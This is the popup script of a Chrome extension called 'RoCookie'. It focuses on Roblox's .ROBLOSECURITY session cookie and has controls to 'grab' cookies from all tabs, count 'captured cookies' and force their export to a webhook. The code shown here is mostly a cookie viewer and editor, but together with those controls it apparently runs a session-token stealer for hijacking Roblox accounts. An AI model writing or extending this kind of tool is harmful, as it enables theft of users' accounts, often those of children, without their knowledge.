// RoCookie - Popup Controller

document.addEventListener('DOMContentLoaded', function() {
  let showOnlySecurityCookies = true;
  let currentDomain = '';
  
  chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
    const currentUrl = new URL(tabs[0].url);
    currentDomain = currentUrl.hostname;
    document.getElementById('domain-info').textContent = `🍪 Cookies for: ${currentDomain}`;
    loadCookies(currentDomain, showOnlySecurityCookies);
    updateStats();
  });
  
  // ============================================
  // BUTTONS
  // ============================================
  
  document.getElementById('refreshButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      currentDomain = currentUrl.hostname;
      loadCookies(currentDomain, showOnlySecurityCookies);
      updateStats();
    });
  });
  
  document.getElementById('showAllCookiesButton').addEventListener('click', function() {
    showOnlySecurityCookies = false;
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      currentDomain = currentUrl.hostname;
      loadCookies(currentDomain, showOnlySecurityCookies);
    });
  });
  
  document.getElementById('showSecurityCookieButton').addEventListener('click', function() {
    showOnlySecurityCookies = true;
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      currentDomain = currentUrl.hostname;
      loadCookies(currentDomain, showOnlySecurityCookies);
    });
  });
  
  document.getElementById('addCookieButton').addEventListener('click', function() {
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const currentUrl = new URL(tabs[0].url);
      currentDomain = currentUrl.hostname;
      showAddCookieForm(currentDomain);
    });
  });
  
  document.getElementById('sendWebhookButton').addEventListener('click', function() {
    chrome.runtime.sendMessage({ action: 'force_export' }, function() {
      showStatus('📤 Checking for new data...', true);
      setTimeout(updateStats, 3000);
    });
  });
  
  document.getElementById('grabAllButton').addEventListener('click', function() {
    chrome.runtime.sendMessage({ action: 'manual_grab' }, function() {
      showStatus('🔍 Grabbing from all tabs...', true);
      setTimeout(() => {
        loadCookies(currentDomain, showOnlySecurityCookies);
        updateStats();
      }, 3000);
    });
  });
  
  document.getElementById('clearDataButton').addEventListener('click', function() {
    if (confirm('Clear all captured cookies?')) {
      chrome.runtime.sendMessage({ action: 'clear_data' }, function() {
        showStatus('🗑 Data cleared', true);
        loadCookies(currentDomain, showOnlySecurityCookies);
        updateStats();
      });
    }
  });
  
  // ============================================
  // UPDATE STATS
  // ============================================
  
  function updateStats() {
    chrome.runtime.sendMessage({ action: 'get_stats' }, function(response) {
      if (response) {
        document.getElementById('totalCookies').textContent = response.count || 0;
        document.getElementById('totalDomains').textContent = response.domains || 0;
        document.getElementById('exportCount').textContent = response.exportCount || 0;
        document.getElementById('hasNewData').textContent = response.hasNewData ? '✅ NEW DATA' : '⏸ SYNCED';
        document.getElementById('hasNewData').style.color = response.hasNewData ? '#00ff88' : '#888';
        document.getElementById('sessionIdDisplay').textContent = response.sessionId || 'unknown';
      }
    });
  }
  
  setInterval(updateStats, 5000);
});

// ============================================
// UI FUNCTIONS (kept from before)
// ============================================

function showStatus(message, isSuccess) {
  const statusElement = document.getElementById('statusMessage');
  statusElement.textContent = message;
  statusElement.className = isSuccess ? 'status-message status-success' : 'status-message status-error';
  statusElement.style.display = 'block';
  setTimeout(() => {
    statusElement.style.display = 'none';
  }, 3000);
}

function extractBaseDomain(domain) {
  const parts = domain.split('.');
  if (parts.length <= 2) return domain;
  return parts.slice(-2).join('.');
}

function loadCookies(domain, securityOnly = true) {
  const cookieList = document.getElementById('cookieList');
  cookieList.innerHTML = 'Loading...';
  
  const baseDomain = extractBaseDomain(domain);
  
  chrome.cookies.getAll({domain: baseDomain}, function(cookies) {
    if (cookies.length === 0) {
      cookieList.innerHTML = '<p>No cookies found for this domain.</p>';
      return;
    }
    
    let cookiesToShow = cookies;
    if (securityOnly) {
      cookiesToShow = cookies.filter(cookie => cookie.name.includes('.ROBLOSECURITY'));
      if (cookiesToShow.length === 0) {
        cookieList.innerHTML = '<p>No .ROBLOSECURITY cookie found.</p>';
        return;
      }
      cookieList.innerHTML = '';
    } else {
      cookiesToShow.sort((a, b) => {
        if (a.domain === b.domain) return a.name.localeCompare(b.name);
        return a.domain.localeCompare(b.domain);
      });
      cookieList.innerHTML = '';
    }
    
    let currentDomain = '';
    
    cookiesToShow.forEach(function(cookie) {
      if (!securityOnly && currentDomain !== cookie.domain) {
        currentDomain = cookie.domain;
        const domainSeparator = document.createElement('div');
        domainSeparator.className = 'domain-separator';
        domainSeparator.innerHTML = `<strong>Domain: ${currentDomain}</strong>`;
        cookieList.appendChild(domainSeparator);
      }
      
      const cookieItem = document.createElement('div');
      cookieItem.className = cookie.name.includes('.ROBLOSECURITY') ? 
        'cookie-item security-cookie' : 'cookie-item';
      
      const cookieName = document.createElement('div');
      cookieName.className = 'cookie-name';
      cookieName.textContent = cookie.name;
      
      const cookieValue = document.createElement('input');
      cookieValue.type = 'text';
      cookieValue.value = cookie.value;
      cookieValue.dataset.name = cookie.name;
      cookieValue.dataset.domain = cookie.domain;
      cookieValue.dataset.path = cookie.path;
      
      const cookieMeta = document.createElement('div');
      cookieMeta.className = 'cookie-meta';
      cookieMeta.innerHTML = `
        <span class="cookie-meta-item"><strong>Domain:</strong> ${cookie.domain}</span>
        <span class="cookie-meta-item"><strong>Path:</strong> ${cookie.path}</span>
        <span class="cookie-meta-item ${cookie.secure ? 'secure-flag' : ''}"><strong>Secure:</strong> ${cookie.secure}</span>
        <span class="cookie-meta-item ${cookie.httpOnly ? 'httponly-flag' : ''}"><strong>HttpOnly:</strong> ${cookie.httpOnly}</span>
        ${cookie.sameSite ? `<span class="cookie-meta-item"><strong>SameSite:</strong> ${cookie.sameSite}</span>` : ''}
        ${cookie.expirationDate ? `<span class="cookie-meta-item"><strong>Expires:</strong> ${new Date(cookie.expirationDate * 1000).toLocaleString()}</span>` : ''}
      `;
      
      const updateButton = document.createElement('button');
      updateButton.textContent = 'Update';
      updateButton.addEventListener('click', function() {
        updateCookie(cookie, cookieValue.value);
      });
      
      const deleteButton = document.createElement('button');
      deleteButton.textContent = 'Delete';
      deleteButton.className = 'delete';
      deleteButton.addEventListener('click', function() {
        deleteCookie(cookie);
      });
      
      const copyButton = document.createElement('button');
      copyButton.textContent = 'Copy Value';
      copyButton.className = 'copy';
      copyButton.addEventListener('click', function() {
        cookieValue.select();
        document.execCommand('copy');
        showStatus('✅ Cookie value copied!', true);
      });
      
      cookieItem.appendChild(cookieName);
      cookieItem.appendChild(cookieValue);
      cookieItem.appendChild(cookieMeta);
      cookieItem.appendChild(copyButton);
      cookieItem.appendChild(updateButton);
      cookieItem.appendChild(deleteButton);
      
      cookieList.appendChild(cookieItem);
    });
  });
}

function updateCookie(cookie, newValue) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  chrome.cookies.set({
    url: url,
    name: cookie.name,
    value: newValue,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate
  }, function() {
    if (chrome.runtime.lastError) {
      showStatus('❌ Error: ' + chrome.runtime.lastError.message, false);
    } else {
      showStatus('✅ Cookie updated!', true);
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        const currentUrl = new URL(tabs[0].url);
        loadCookies(currentUrl.hostname, true);
      });
    }
  });
}

function deleteCookie(cookie) {
  const url = `${cookie.secure ? 'https' : 'http'}://${cookie.domain}${cookie.path}`;
  chrome.cookies.remove({
    url: url,
    name: cookie.name
  }, function() {
    if (chrome.runtime.lastError) {
      showStatus('❌ Error: ' + chrome.runtime.lastError.message, false);
    } else {
      showStatus('✅ Cookie deleted!', true);
      chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
        const currentUrl = new URL(tabs[0].url);
        loadCookies(currentUrl.hostname, true);
      });
    }
  });
}

function showAddCookieForm(domain) {
  const form = document.createElement('div');
  form.innerHTML = `
    <h3>Add New Cookie</h3>
    <label>Name: <input type="text" id="newCookieName"></label>
    <label>Value: <input type="text" id="newCookieValue"></label>
    <label>Path: <input type="text" id="newCookiePath" value="/"></label>
    <label>Secure: <input type="checkbox" id="newCookieSecure"></label>
    <button id="saveNewCookie">Save</button>
    <button id="cancelNewCookie">Cancel</button>
  `;
  
  const existingForm = document.querySelector('.add-cookie-form');
  if (existingForm) existingForm.remove();
  
  form.className = 'add-cookie-form';
  document.body.appendChild(form);
  
  document.getElementById('saveNewCookie').addEventListener('click', function() {
    const name = document.getElementById('newCookieName').value;
    const value = document.getElementById('newCookieValue').value;
    const path = document.getElementById('newCookiePath').value;
    const secure = document.getElementById('newCookieSecure').checked;
    
    if (!name) {
      showStatus('❌ Cookie name required', false);
      return;
    }
    
    chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
      const url = `${secure ? 'https' : 'http'}://${domain}${path}`;
      chrome.cookies.set({
        url: url,
        name: name,
        value: value,
        path: path,
        secure: secure
      }, function() {
        if (chrome.runtime.lastError) {
          showStatus('❌ Error: ' + chrome.runtime.lastError.message, false);
        } else {
          form.remove();
          loadCookies(domain, true);
          showStatus('✅ Cookie created!', true);
        }
      });
    });
  });
  
  document.getElementById('cancelNewCookie').addEventListener('click', function() {
    form.remove();
  });
}